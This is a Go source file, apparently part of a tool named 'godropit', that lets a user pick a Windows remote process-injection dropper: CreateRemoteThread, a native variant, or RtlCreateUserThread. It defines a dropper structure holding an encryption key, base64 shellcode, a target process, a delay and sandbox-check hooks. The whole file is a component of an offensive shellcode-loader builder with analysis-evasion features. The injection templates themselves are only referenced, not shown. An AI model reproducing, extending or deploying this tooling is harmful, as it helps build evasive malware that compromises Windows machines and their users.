package remote

import (
	"godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateRemoteThread", "CreateRemoteThreadNative", "RtlCreateUserThread"}

type RemoteDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	RemoteProc string //Program Proc to Execute in
	Delay      int
	Dlls       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
	ProcAttach string
	Init       string
}

var FuncName = "SystemFunction_032"
var Export = "export"

func SelectRemote() (Dlls, Inject, Import, Extra string) {

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the remote dropper you would like to use:")

	switch selected {
	case "CreateRemoteThread":
		Dlls = CreateRemoteThreadDlls
		Inject = CreateRemoteThread
		Import = CreateRemoteThreadImports
	case "CreateRemoteThreadNative":
		Dlls = CreateRemoteThreadNativeDlls
		Inject = CreateRemoteThreadNative
		Import = CreateRemoteThreadNativeImports
	case "RtlCreateUserThread":
		Dlls = RtlCreateUserThreadDlls
		Inject = RtlCreateUserThread
		Import = RtlCreateUserThreadImports
	}

	return Dlls, Inject, Import, Extra
}
